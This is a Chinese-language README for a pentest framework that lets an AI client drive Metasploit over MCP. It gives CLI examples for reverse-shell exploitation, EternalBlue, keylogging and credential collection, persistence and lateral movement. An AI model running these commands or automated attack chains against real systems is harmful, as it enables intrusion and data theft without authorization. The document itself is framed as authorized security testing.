# 滲透測試自動化框架 (Pentest Automation Framework)

[![GitHub Repository](https://img.shields.io/badge/GitHub-pentest--automation--framework--2025-blue?logo=github)](https://github.com/alex-chh/pentest-automation-framework-2025)
[![Python Version](https://img.shields.io/badge/Python-3.8%2B-green)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-yellow)](LICENSE)
[![Docker](https://img.shields.io/badge/Docker-Ready-blue?logo=docker)](Dockerfile)

## 🎯 項目概述

這是一個完整的滲透測試自動化框架，深度整合了 **Metasploit** 和 **GitHub MCP** 功能，提供端到端的滲透測試解決方案。框架採用模塊化設計，支持從目標發現到報告生成的完整自動化流程，適用於專業滲透測試、安全評估和紅隊演練。

### 🌟 核心亮點
- 🔥 **深度 Metasploit 整合**: 完整的漏洞利用、載荷生成和會話管理
- 📊 **智能報告系統**: 多格式報告生成 (HTML/PDF/JSON/XML)
- 🐳 **容器化部署**: 完整的 Docker 和 Docker Compose 支持
- 🔗 **GitHub 整合**: 自動報告上傳和版本控制
- 🛡️ **安全合規**: 內建安全檢查和審計日誌
- 🔧 **擴展性設計**: 模塊化架構支持插件和自定義擴展

## 🏗️ 已完成的核心功能

### 📦 框架架構 (9,858+ 行代碼)

#### 🔧 核心模塊 (`src/core/`)
- **主框架類**: 完整的滲透測試流程管理
- **配置管理**: 靈活的配置系統和環境變量支持
- **日誌系統**: 結構化日誌記錄和審計追蹤

#### 🗄️ 數據庫模塊 (`src/database/`)
- **多數據庫支持**: SQLite (開發) / PostgreSQL (生產)
- **數據模型**: 完整的滲透測試數據結構
- **遷移系統**: 自動化數據庫版本管理

#### 🔍 掃描器模塊 (`src/scanners/`)
- **網絡掃描**: Nmap 整合和端口發現
- **漏洞掃描**: 自動化漏洞識別和分類
- **服務識別**: 深度服務指紋識別

#### 💥 漏洞利用模塊 (`src/exploits/`)
- **Metasploit 整合**: 完整的 MSF RPC 客戶端
- **載荷管理**: 自動載荷生成和部署
- **會話管理**: Meterpreter 會話控制

#### 🎯 後滲透模塊 (`src/post_exploit/`)
- **數據收集**: 系統信息和敏感數據提取
- **權限提升**: 自動化提權嘗試
- **持久化**: 後門和持久化機制

#### 🔗 MCP 整合模塊 (`src/integrations/`)
- **Metasploit MCP**: 深度 MSF 功能整合
- **GitHub MCP**: 自動報告上傳和版本控制
- **API 客戶端**: 統一的外部服務接口

#### 🛠️ 工具模塊 (`src/utils/`)
- **網絡工具**: IP 處理、端口掃描、協議分析
- **編碼工具**: Base64、URL、十六進制編碼
- **載荷生成**: 自定義載荷和 Shellcode 生成

### 🎛️ 主要特性

#### 🤖 自動化滲透測試流程
- 目標發現和驗證
- 漏洞掃描和分析
- 自動化漏洞利用
- 後滲透操作
- 報告生成和上傳

#### 📊 多格式報告生成
- **HTML 報告**: 互動式 Web 報告
- **PDF 報告**: 專業格式文檔
- **JSON/XML**: 結構化數據輸出
- **自定義模板**: 可配置報告格式

#### 🐳 容器化部署
- **Docker 支持**: 單容器部署
- **Docker Compose**: 多服務編排
- **微服務架構**: PostgreSQL + Redis + Nginx
- **監控整合**: Grafana + Prometheus + ELK Stack

#### 🔒 安全和合規
- **審計日誌**: 完整的操作記錄
- **權限控制**: 基於角色的訪問控制
- **數據加密**: 敏感數據保護
- **合規檢查**: 自動化合規性驗證

## 📁 項目結構

```
pentest-automation-framework/
├── README.md                 # 項目說明文檔
├── requirements.txt          # Python 依賴包 (77個精選包)
├── setup.py                 # 安裝配置和包管理
├── main.py                  # 主程序入口和CLI界面
├── .env.example             # 環境變量配置模板
├── .gitignore              # Git 忽略規則
├── Dockerfile              # Docker 容器配置
├── docker-compose.yml      # 多服務編排配置
├── Makefile                # 自動化構建和部署
├── src/                    # 源代碼目錄 (9,858+ 行)
│   ├── __init__.py
│   ├── core/               # 核心框架模塊
│   │   ├── framework.py    # 主框架類
│   │   ├── config.py       # 配置管理
│   │   └── logger.py       # 日誌系統
│   ├── database/           # 數據庫模塊
│   │   ├── models.py       # 數據模型
│   │   └── manager.py      # 數據庫管理
│   ├── scanners/           # 掃描器模塊
│   │   ├── network.py      # 網絡掃描
│   │   └── vulnerability.py # 漏洞掃描
│   ├── exploits/           # 漏洞利用模塊
│   │   ├── manager.py      # 利用管理
│   │   └── metasploit.py   # MSF 整合
│   ├── post_exploit/       # 後滲透模塊
│   │   ├── data_collection.py # 數據收集
│   │   └── persistence.py  # 持久化
│   ├── integrations/       # MCP 整合模塊
│   │   ├── metasploit_mcp.py # Metasploit MCP
│   │   └── github_mcp.py   # GitHub MCP
│   └── utils/              # 工具模塊
│       ├── network.py      # 網絡工具
│       ├── encoding.py     # 編碼工具
│       └── payload.py      # 載荷生成
└── reports/                # 報告輸出目錄
```

## 🚀 GitHub 部署

項目已成功部署到 GitHub：
**🔗 [https://github.com/alex-chh/pentest-automation-framework-2025](https://github.com/alex-chh/pentest-automation-framework-2025)**

### 📈 部署統計
- ✅ **19 個核心文件**已提交
- 📝 **9,858+ 行代碼**實現
- 🏷️ **77 個依賴包**精選配置
- 🐳 **完整容器化**支持
- 📚 **完整文檔**和配置

## 🛠️ 安裝與配置

### 📋 環境要求
- **Python**: 3.8+ (推薦 3.11)
- **Metasploit Framework**: 最新版本
- **Docker**: 20.10+ (可選，用於容器化部署)
- **Git**: 版本控制
- **操作系統**: Linux/macOS/Windows

### ⚡ 快速開始

#### 方法一：直接安裝
```bash
# 1. 克隆項目
git clone https://github.com/alex-chh/pentest-automation-framework-2025.git
cd pentest-automation-framework-2025

# 2. 快速啟動 (使用 Makefile)
make quick-start

# 或手動安裝
pip install -r requirements.txt
cp .env.example .env
# 編輯 .env 配置必要參數
python main.py --help
```

#### 方法二：Docker 部署
```bash
# 1. 克隆項目
git clone https://github.com/alex-chh/pentest-automation-framework-2025.git
cd pentest-automation-framework-2025

# 2. Docker Compose 啟動
docker-compose up -d

# 3. 檢查服務狀態
docker-compose ps
```

### 🎯 使用方式

#### 命令行界面 (CLI)
```bash
# 完整滲透測試流程
python main.py full --targets 192.168.1.0/24 --output reports/

# 僅執行掃描
python main.py scan --targets 192.168.1.100 --scan-type comprehensive

# 漏洞利用
python main.py exploit --target 192.168.1.100 --exploit-db

# 生成報告
python main.py report --input results.json --format html,pdf

# 啟動 Web 界面
python main.py web --host 0.0.0.0 --port 8080
```

#### Makefile 快捷命令
```bash
# 快速開始
make quick-start

# 運行測試
make test

# 啟動 Web 界面
make run-web

# Docker 部署
make docker-build
make docker-run

# 清理環境
make clean
```

#### Python API 使用
```python
from src.core.framework import PentestFramework
from src.integrations.metasploit_mcp import MetasploitMCP
from src.integrations.github_mcp import GitHubMCP

# 初始化框架
framework = PentestFramework()

# 配置目標和選項
targets = ['192.168.1.100', '192.168.1.101']
options = {
    'scan_type': 'comprehensive',
    'exploit_level': 'safe',
    'generate_report': True,
    'upload_to_github': True
}

# 執行自動化滲透測試
results = framework.run_automated_pentest(
    targets=targets,
    **options
)

# 處理結果
print(f"掃描完成: {len(results.hosts)} 個主機")
print(f"發現漏洞: {len(results.vulnerabilities)} 個")
print(f"成功利用: {len(results.exploited)} 個")

# 生成和上傳報告
report_path = framework.generate_report(results, format='html')
framework.upload_to_github(report_path)
```

## 🔧 MCP 整合配置

### 🎯 Metasploit MCP 功能
- **🔍 漏洞掃描**: 自動化 Nmap 和 MSF 輔助模塊
- **💥 漏洞利用**: 智能漏洞匹配和自動化攻擊
- **🚀 載荷生成**: 多平台載荷生成和編碼
- **🎮 會話管理**: Meterpreter 會話控制和命令執行
- **📡 監聽器管理**: 自動化 Handler 配置和管理
- **🔧 後滲透**: 自動化後滲透模塊執行

### 📊 GitHub MCP 功能
- **📝 報告管理**: 自動上傳滲透測試報告
- **🔄 版本控制**: 測試結果和配置的版本管理
- **👥 團隊協作**: 多人協作和結果共享
- **📋 問題追蹤**: 漏洞和修復建議的 Issue 管理
- **🏷️ 標籤系統**: 測試類型和嚴重程度分類
- **📈 統計分析**: 測試歷史和趨勢分析

### ⚙️ 配置示例
```bash
# .env 配置文件
METASPLOIT_HOST=localhost
METASPLOIT_PORT=55553
METASPLOIT_USER=msf
METASPLOIT_PASS=password

GITHUB_TOKEN=ghp_xxxxxxxxxxxx
GITHUB_OWNER=your-username
GITHUB_REPO=pentest-reports

DATABASE_URL=postgresql://user:pass@localhost/pentestdb
REDIS_URL=redis://localhost:6379/0
```

## 📊 實際使用範例

### 🎯 完整滲透測試流程
```python
from src.core.framework import PentestFramework
from src.integrations.metasploit_mcp import MetasploitMCP
from src.integrations.github_mcp import GitHubMCP

# 初始化框架和 MCP 客戶端
framework = PentestFramework()
msf_client = MetasploitMCP()
github_client = GitHubMCP()

# 1. 目標發現和掃描
targets = framework.discover_targets('192.168.1.0/24')
scan_results = framework.comprehensive_scan(targets)

# 2. 漏洞分析和利用
vulnerabilities = framework.analyze_vulnerabilities(scan_results)
exploit_results = framework.auto_exploit(vulnerabilities)

# 3. 後滲透操作
for session in exploit_results.active_sessions:
    post_data = framework.post_exploitation(session)
    
# 4. 報告生成和上傳
report = framework.generate_comprehensive_report({
    'scan_results': scan_results,
    'vulnerabilities': vulnerabilities,
    'exploit_results': exploit_results,
    'post_exploit_data': post_data
})

# 5. 自動上傳到 GitHub
github_client.upload_report(report, 
    repo='pentest-reports',
    branch=f'pentest-{datetime.now().strftime("%Y%m%d")}')

print(f"✅ 滲透測試完成:")
print(f"   📡 掃描主機: {len(targets)}")
print(f"   🔍 發現漏洞: {len(vulnerabilities)}")
print(f"   💥 成功利用: {len(exploit_results.successful)}")
print(f"   📊 報告已上傳: {report.github_url}")
```

## 🎯 10個實用滲透測試利用示例

以下是基於本框架的10個實際可執行的滲透測試利用示例，涵蓋從網絡發現到完整攻擊鏈的各個階段：

### 🔍 網絡掃描與發現類

#### 1. 快速網絡發現
```bash
# 發現內網中的活跃主機和開放端口
python main.py scan -t 192.168.1.0/24 --scan-type quick
```
**用途**: 快速識別網絡中的活跃設備，適用於初始偵察階段

#### 2. 深度漏洞掃描
```bash
# 對特定目標進行全面的漏洞識別
python main.py scan -t 192.168.1.100 --scan-type comprehensive --vuln-scan
```
**用途**: 深入分析目標系統的安全狀況，識別潛在攻擊向量

#### 3. 服務指紋識別
```bash
# 識別目標系統的服務版本和操作系統
python main.py scan -t 192.168.1.1-50 --service-detection --os-detection
```
**用途**: 收集目標系統詳細信息，為後續攻擊做準備

### 💥 漏洞利用與攻擊類

#### 4. 自動化漏洞利用
```bash
# 自動選擇合適的漏洞利用模塊攻擊目標
python main.py exploit -t 192.168.1.100 --auto --payload windows/meterpreter/reverse_tcp
```
**用途**: 智能匹配並執行最適合的漏洞利用，提高成功率

#### 5. SMB漏洞利用 (永恆之藍)
```bash
# 利用永恆之藍漏洞獲取系統權限
python main.py exploit -t 192.168.1.100 --module ms17_010_eternalblue --lhost 192.168.1.50
```
**用途**: 針對未修補的Windows系統執行經典的SMB漏洞攻擊

#### 6. Web應用漏洞利用
```bash
# 對Web應用進行SQL注入和XSS攻擊
python main.py exploit -t http://192.168.1.100:8080 --web-exploit --sqli --xss
```
**用途**: 自動化Web應用安全測試，發現常見Web漏洞

### 🎯 後滲透與數據收集類

#### 7. 權限提升
```bash
# 在已獲得的會話中進行權限提升和信息收集
python main.py post --session-id 1 --privilege-escalation --gather-system-info
```
**用途**: 在獲得初始訪問後，嘗試提升權限並收集系統信息

#### 8. 敏感數據收集
```bash
# 收集目標系統中的敏感數據和憑據
python main.py post --session-id 1 --collect-passwords --collect-files --keylogger
```
**用途**: 提取目標系統中的密碼、文件和鍵盤記錄等敏感信息

### 🔄 完整流程與高級攻擊類

#### 9. 端到端滲透測試
```bash
# 執行完整的滲透測試流程：掃描→利用→後滲透→報告生成
python main.py full -t 192.168.1.0/24 --output-dir ./pentest_results --report-format html
```
**用途**: 一鍵執行完整的滲透測試流程，適用於全面的安全評估

#### 10. 紅隊演練模擬
```bash
# 模擬APT攻擊，包含隱蔽性、持久化和橫向移動
python main.py full -t company.com --stealth-mode --persistence --lateral-movement
```
**用途**: 模擬高級持續性威脅(APT)攻擊，測試組織的檢測和響應能力

### 📊 報告生成與管理

#### 額外功能：多格式專業報告
```bash
# 生成專業的滲透測試報告
python main.py report --target 192.168.1.100 --format html,pdf,json --template executive
```
**用途**: 為管理層和技術團隊生成不同格式的專業報告

### ⚠️ 使用注意事項

- **🏛️ 合法授權**: 僅在獲得明確授權的環境中使用這些示例
- **🧪 測試環境**: 建議先在虛擬實驗環境中練習和驗證
- **📝 日誌記錄**: 框架會自動記錄所有操作，便於審計和分析
- **🛡️ 安全合規**: 嚴格遵循相關法律法規和道德準則
- **🔄 持續學習**: 定期更新知識和技能，跟上安全威脅的發展

這些示例展示了框架從基礎掃描到高級APT模擬的強大功能，為專業滲透測試提供完整的解決方案。🛡️

### 🔧 高級配置範例
```python
# 自定義掃描配置
scan_config = {
    'nmap_options': '-sS -sV -O --script vuln',
    'timeout': 300,
    'threads': 10,
    'exclude_ports': [22, 443],
    'custom_scripts': ['http-enum', 'smb-enum-shares']
}

# 自定義利用配置
exploit_config = {
    'safety_level': 'safe',  # safe, normal, aggressive
    'auto_migrate': True,
    'cleanup': True,
    'max_sessions': 5,
    'payload_encoder': 'x86/shikata_ga_nai'
}

# 執行配置化測試
results = framework.run_configured_test(
    targets=['192.168.1.100'],
    scan_config=scan_config,
    exploit_config=exploit_config
)
```

## 🔒 安全注意事項

### ⚠️ **重要警告**
- **🏛️ 法律合規**: 僅在獲得明確書面授權的環境中使用
- **🌍 法律責任**: 嚴格遵守當地法律法規和國際網絡安全法律
- **🚫 禁止濫用**: 嚴禁用於未授權的惡意攻擊或非法活動
- **🔄 定期更新**: 定期更新框架和安全配置以防範新威脅
- **📝 審計記錄**: 保持完整的測試記錄和審計日誌
- **🔐 數據保護**: 妥善保護測試過程中獲取的敏感信息

### 🛡️ 內建安全機制
- **權限控制**: 基於角色的訪問控制 (RBAC)
- **審計日誌**: 完整的操作記錄和時間戳
- **數據加密**: 敏感數據的傳輸和存儲加密
- **會話管理**: 安全的會話創建和清理機制
- **合規檢查**: 自動化的合規性驗證和報告

### 📋 使用前檢查清單
- [ ] 已獲得目標系統的書面測試授權
- [ ] 已了解並遵守相關法律法規
- [ ] 已配置適當的測試範圍和限制

## 🔗 MCP 整合功能詳解

本框架整合了兩個重要的 MCP (Model Context Protocol) 服務器，為滲透測試提供強大的自動化和管理能力：

### 🎯 **Metasploit MCP 整合功能**

**核心能力：**
- **漏洞利用管理**：自動列出、搜索和執行 Metasploit 的 exploit 模組
- **Payload 生成**：支援多種格式（exe、python、raw等）和平台的 payload 創建
- **會話管理**：管理活躍的 Meterpreter 和 Shell 會話，執行命令和控制
- **監聽器控制**：啟動和停止各種類型的 handler 監聽器
- **後滲透模組**：執行系統信息收集、權限提升等後滲透操作
- **輔助模組**：運行掃描器、暴力破解等輔助工具

**實際幫助：**
- 透過自然語言查詢 Metasploit 功能（如「列出所有 Windows SMB 漏洞利用」）
- 自動化完整攻擊鏈：從掃描→利用→後滲透→數據收集
- 支援跨平台部署（Windows Trae AI ↔ Kali Linux Metasploit）
- 提供 HTTP API 接口，實現遠程 Metasploit 控制

### 📊 **GitHub MCP 整合功能**

**核心能力：**
- **倉庫管理**：創建、搜索和管理滲透測試項目倉庫
- **文件操作**：上傳測試報告、配置文件和 payload 到 GitHub
- **問題追蹤**：自動創建漏洞報告和測試結果的 Issue
- **版本控制**：管理滲透測試腳本和工具的版本迭代
- **協作功能**：創建 Pull Request 進行代碼審查和團隊協作
- **報告發布**：將 HTML/PDF 格式的滲透測試報告發布到 GitHub Pages

**實際幫助：**
- **自動化報告管理**：測試完成後自動上傳報告到指定倉庫
- **漏洞追蹤**：為發現的每個漏洞自動創建 GitHub Issue，包含詳細信息
- **團隊協作**：多人滲透測試項目的代碼和報告集中管理
- **合規記錄**：完整的測試過程和結果版本控制，滿足審計要求

### 🔄 **整合優勢**

**工作流程自動化：**
1. **掃描階段**：使用 Metasploit MCP 執行網絡掃描和漏洞識別
2. **利用階段**：自動選擇和執行適當的 exploit 模組
3. **後滲透階段**：收集系統信息、提升權限、橫向移動
4. **報告階段**：使用 GitHub MCP 自動生成和發布測試報告
5. **追蹤階段**：為每個發現的漏洞創建 GitHub Issue 進行後續跟進

**技術架構：**
```
┌─────────────────┐    HTTP/8085    ┌─────────────────┐    RPC/55553    ┌─────────────────┐
│   Windows       │◄──────────────►│   Kali Linux    │◄──────────────►│   Metasploit    │
│   (Trae AI)     │                │   (MetasploitMCP)│                │   Framework     │
│   10.0.0.85     │                │   172.31.44.17  │                │   127.0.0.1     │
└─────────────────┘                └─────────────────┘                └─────────────────┘
         │                                                                        
         │                          GitHub API                                    
         └─────────────────────────────────────────────────────────────────────►
                                   (報告上傳/問題追蹤)                              
```

**實用價值：**
- **效率提升**：將手動操作轉為自動化流程，大幅減少測試時間
- **標準化**：統一的測試流程和報告格式，提高專業性
- **可追溯性**：完整的操作記錄和版本控制，便於審計和復現
- **團隊協作**：支援多人同時進行滲透測試項目
- **合規支援**：自動生成符合行業標準的測試報告和文檔

這個整合方案將傳統的手動滲透測試轉變為智能化、自動化的現代安全測試平台，大幅提升了滲透測試的效率和專業性。
- [ ] 已設置安全的測試環境
- [ ] 已準備事故響應和恢復計劃

## 📊 依賴管理

### 🐍 Python 依賴 (77 個精選包)
```bash
# 核心框架
flask>=2.3.0
fastapi>=0.104.0
sqlalchemy>=2.0.0
pydantic>=2.5.0

# 滲透測試工具
nmap>=0.7.1
scapy>=2.5.0
impacket>=0.11.0
requests>=2.31.0

# MCP 整合
github3.py>=4.0.1
python-dotenv>=1.0.0
aiohttp>=3.9.0

# 報告生成
jinja2>=3.1.0
reportlab>=4.0.0
matplotlib>=3.8.0

# 完整列表見 requirements.txt
```

## 🐳 Docker 部署詳情

### 服務架構
- **主應用**: Python 3.11 + 滲透測試框架
- **數據庫**: PostgreSQL 15 (生產) / SQLite (開發)
- **緩存**: Redis 7.2
- **代理**: Nginx (反向代理和負載均衡)
- **監控**: Grafana + Prometheus
- **日誌**: Elasticsearch + Kibana
- **可選**: Metasploit 服務容器

### 端口配置
- **8080**: Web 界面 (HTTP)
- **8443**: Web 界面 (HTTPS)
- **4444-4500**: Metasploit 監聽器端口範圍
- **5432**: PostgreSQL 數據庫
- **6379**: Redis 緩存
- **9200**: Elasticsearch
- **5601**: Kibana 界面

## 📝 許可證

**MIT License** - 詳見 [LICENSE](LICENSE) 文件

## 🤝 貢獻指南

歡迎貢獻代碼和改進建議！

### 貢獻流程
1. Fork 本倉庫
2. 創建功能分支 (`git checkout -b feature/amazing-feature`)
3. 提交更改 (`git commit -m 'Add amazing feature'`)
4. 推送到分支 (`git push origin feature/amazing-feature`)
5. 創建 Pull Request

### 開發指南
- 遵循 PEP 8 代碼風格
- 添加適當的測試用例
- 更新相關文檔
- 確保所有測試通過

## 📞 支持與聯繫

- **📚 項目文檔**: [GitHub Repository](https://github.com/alex-chh/pentest-automation-framework-2025)
- **🐛 問題報告**: [GitHub Issues](https://github.com/alex-chh/pentest-automation-framework-2025/issues)
- **💬 討論交流**: [GitHub Discussions](https://github.com/alex-chh/pentest-automation-framework-2025/discussions)
- **📧 聯繫方式**: 通過 GitHub Issues 或 Discussions

## 🏆 致謝

感謝以下開源項目和社區的支持：
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Nmap](https://nmap.org/)
- [Python Security Tools](https://github.com/topics/python-security)
- [MCP Protocol](https://modelcontextprotocol.io/)

---

### 📋 免責聲明

**⚠️ 重要提醒**: 本工具僅供**教育目的**和**授權安全測試**使用。使用者必須：

1. **獲得明確授權**才能對任何系統進行測試
2. **遵守所有適用的法律法規**
3. **承擔使用本工具的全部責任**
4. **不得將本工具用於任何非法或惡意目的**

開發者不對本工具的誤用或濫用承擔任何責任。使用本工具即表示您同意上述條款。

---

**🚀 立即開始您的安全測試之旅！**

[![Get Started](https://img.shields.io/badge/Get%20Started-Now-success?style=for-the-badge)](https://github.com/alex-chh/pentest-automation-framework-2025)
[![Documentation](https://img.shields.io/badge/Read-Documentation-blue?style=for-the-badge)](https://github.com/alex-chh/pentest-automation-framework-2025/blob/main/README.md)